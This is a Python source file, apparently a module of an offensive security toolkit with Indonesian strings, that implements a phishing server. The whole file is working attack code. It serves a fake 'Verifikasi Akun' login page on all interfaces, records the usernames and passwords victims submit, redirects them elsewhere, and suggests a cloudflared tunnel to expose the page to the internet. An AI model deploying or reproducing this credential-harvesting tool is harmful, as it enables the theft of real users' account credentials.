# -*- coding: utf-8 -*-
"""Social engineering: server phishing lokal."""
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from ..core import netutil as nu
from ..core.logger import col, D, G
from ._base import MODULES, mod


def _page(title):
    return f"""<!doctype html><meta name=viewport content="width=device-width,initial-scale=1">
<title>{title}</title><style>body{{margin:0;background:#0d1117;color:#e6edf3;
font-family:system-ui;display:grid;place-items:center;min-height:100vh}}
.c{{width:min(380px,92vw);background:#161b22;border:1px solid #30363d;border-radius:14px;padding:26px}}
h1{{font-size:18px}}input{{width:100%;padding:11px;margin:6px 0;border-radius:8px;
border:1px solid #30363d;background:#0d1117;color:#fff;box-sizing:border-box}}
b{{display:block;background:#238636;color:#fff;text-align:center;padding:12px;
border-radius:8px;margin-top:14px}}</style>
<div class=c><h1>{title}</h1><form method=post>
<input name=u placeholder="Email / Username" required>
<input name=p type=password placeholder="Password" required>
<b>Masuk</b></form></div>"""


@mod(name="se.phish", category="se", desc="Server phishing lokal + tangkap kredensial",
     params={"title": {"default": "Verifikasi Akun"}, "redirect": {"default": None},
             "port": {"default": 8080}, "duration": {"default": 0}})
def phish(ctx):
    page = _page(ctx.p("title")).encode()
    redirect = ctx.p("redirect") or ctx.cfg.get("redirect")
    port = ctx.pi("port")

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(page)

        def do_POST(self):
            n = int(self.headers.get("Content-Length") or 0)
            d = urllib.parse.parse_qs(self.rfile.read(n).decode(errors="replace"))
            u = d.get("u", [""])[0]
            p = d.get("p", [""])[0]
            ctx.cred(u, p, "password", "se.phish")
            self.send_response(302)
            self.send_header("Location", redirect)
            self.end_headers()

    srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    ip = nu.my_ip()
    ctx.out(f"  server: http://{ip}:{port}")
    ctx.finding("phishing server", "info", f"http://{ip}:{port}")
    if nu.have("cloudflared"):
        ctx.out(f"  publik: cloudflared tunnel --url http://localhost:{port}")
    end = time.time() + ctx.pi("duration")
    try:
        while not ctx.stopped and (ctx.pi("duration") == 0 or time.time() < end):
            time.sleep(0.5)
    finally:
        srv.shutdown()
    return "phish selesai"
